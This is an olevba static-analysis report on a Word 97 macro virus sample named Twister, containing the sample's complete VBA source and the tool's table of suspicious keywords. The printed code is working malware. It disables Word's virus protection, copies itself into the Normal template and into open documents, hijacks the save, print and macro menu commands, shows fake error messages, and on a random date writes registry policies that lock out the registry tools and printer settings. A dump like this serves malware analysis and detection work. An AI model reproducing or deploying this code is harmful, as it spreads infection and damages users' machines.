olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twister.a-d25fe1b1e20b8451b145a49e07989306211eb829
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twister.a-d25fe1b1e20b8451b145a49e07989306211eb829 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Twister.bas 
in file: Virus.MSWord.Twister.a-d25fe1b1e20b8451b145a49e07989306211eb829 - OLE stream: 'Macros/VBA/Twister'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function InstNor()
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(x).Name = "Twister" Then
    InstNor = True
    End If
Next x
End Function
Function InstDok()
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "Twister" Then
    InstDok = True
    End If
Next x
End Function
Sub AutoOpen()
On Error Resume Next
WordBasic.DisableAutoMacros
Application.ScreenUpdating = False: Application.ShowVisualBasicEditor = False
Application.Caption = "Micrøsøft Wørd - TwIsTeR"
Options.VirusProtection = False: Options.SaveNormalPrompt = False
Options.AllowFastSave = False: Options.BlueScreen = True

Assistant.Visible = True
Assistant.Animation = msoAnimationThinking
With Assistant.NewBalloon
    .Heading = "This is WM97.Twister"
    .Text = "Autor: Zerø|<LzØ>"
    .Show
End With
Assistant.Visible = False

FN$ = "C:\Progra~1\TSR32.vxd"
Application.VBE.ActiveVBProject.VBComponents.Item("Twister").Export FN$
Infection
Twister
End Sub
Sub DateiDrucken()
Infection
Twister
Application.ScreenUpdating = False
Randomize
Zu$ = Int((Rnd) * 5 + 1)

Select Case Zu$
Case 1
    Font$ = "Windings"
Case 2
    Font$ = "Bookman Old Style"
Case 3
    Font$ = "Arial"
Case 4
    Font$ = "Times New Roman"
Case 5
    Font$ = "System"
End Select

Selection.WholeStory
FontV$ = Selection.Font.Name
Size$ = Selection.Font.Size
Selection.Font.Name = Font$
Selection.Font.Size = Int((Rnd) * 100 + 1)
Dialogs(wdDialogFilePrint).Show
Selection.Font.Name = FonfV$
Selection.Font.Size = Size$
End Sub
Sub Infection()
On Error Resume Next
If InstNor = False Then
    NormalTemplate.VBProject.VBComponents.Import FN$
End If
If InstDok = False Then
    ActiveDocument.VBProject.VBComponents.Import FN$
End If
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "This is WM97.Twister"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Autor: Zerø|<LzØ>"
End Sub
Sub DateiSpeichernUnter()
CheckLines
Infection
Twister
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub DateiSpeichern()
Infection
Twister
ActiveDocument.SaveAs WordBasic.[Filename$]
End Sub
Sub CheckLines()
Lines$ = Application.VBE.ActiveCodePane.CodeModule.CountOfLines
If Lines$ <> 171 Then
Infection
End If
End Sub
Sub DateiDruckenStandard()
Twister
Infection
Application.ScreenUpdating = False
WordBasic.EndOfDocument
Selection.TypeParagraph
Selection.TypeParagraph
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
Selection.Font.ColorIndex = wdGray25
Selection.Font.Name = "Times New Roman"
Selection.Font.Size = 20
WordBasic.Insert "This is WM97.Twister"
ActiveDocument.PrintOut
End Sub
Sub DateiDokVorlagen()
Twister
Infection
MsgBox "Die zum Ausführen des Programms benötigte Datei (Word32.vxd) wurde nicht gefunden!", vbCritical, "Word Fehler:"
End Sub
Sub AnsichtCode()
Twister
Infection
MsgBox "Die zum Ausführen des Programms benötigte Datei (Word32.vxd) wurde nicht gefunden!", vbCritical, "Word Fehler:"
End Sub
Sub AnsichtVBCode()
Infection
Twister
MsgBox "Die zum Ausführen des Programms benötigte Datei (Word32.vxd) wurde nicht gefunden!", vbCritical, "Word Fehler:"
End Sub
Sub ExtrasMakro()
Infection
Twister
'Thanxs to Jack Twoflower for this great Code :}
Dim x
ReDim Combobox1__$(0)
Combobox1__$(0) = ""
ReDim Textbox1__$(0)
Textbox1__$(0) = ""
ReDim Droplistbox2__$(0)
Droplistbox2__$(0) = "Normal.dot (Globale Dokumentvorlage)"

WordBasic.BeginDialog 620, 280, "Makros"
WordBasic.Text 7, 6, 93, 13, "&Makroname:", "Text3"
WordBasic.ComboBox 7, 23, 435, 170, Combobox1__$(), "Combobox1"
WordBasic.Pushbutton 470, 14, 137, 21, "&Ausführen", "Definierbar2"
WordBasic.Cancelbutton 470, 38, 137, 21
WordBasic.Pushbutton 470, 72, 137, 21, "&Schrittweise prüfen", "Definierbar3"
WordBasic.Pushbutton 470, 96, 137, 21, "&Bearbeiten", "Definierbar4"
WordBasic.Pushbutton 470, 130, 137, 21, "&Erstellen", "Definierbar5"
WordBasic.Pushbutton 470, 154, 137, 21, "O&rganisieren", "Definierbar6"
WordBasic.Pushbutton 470, 178, 137, 21, "&Organisieren...", "Definierbar7"
WordBasic.Text 7, 200, 93, 13, "Ma&kros in:", "Text1"
WordBasic.Droplistbox 90, 196, 354, 19, Droplistbox2__$(), "Listbox2"
WordBasic.Text 7, 222, 109, 13, "Besc&hreibung:", "Text2"
WordBasic.TextBox 7, 235, 437, 38, Textbox1__$()
WordBasic.EndDialog

Dim dlg As Object
Set dlg = WordBasic.CurValues.Userdialog

x = WordBasic.Dialog.Userdialog(dlg)
Select Case x
Case 0
WordBasic.Cancel
Case 1 To 6
MsgBox "Zu wenig EMS-Speicher um Anwendung auszuführen!", vbCritical, "Word-Fehler:"
End Select
End Sub
Sub Twister()
Mo$ = Int((Rnd) * 12 + 1)
Da$ = Int((Rnd) * 20 + 1)
If Month(Now) = Mo$ And Day(Now) = Da$ Then
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDeletePrinter") = 1
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoAddPrinter") = 1
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools") = 1
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispCPL") = 1
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

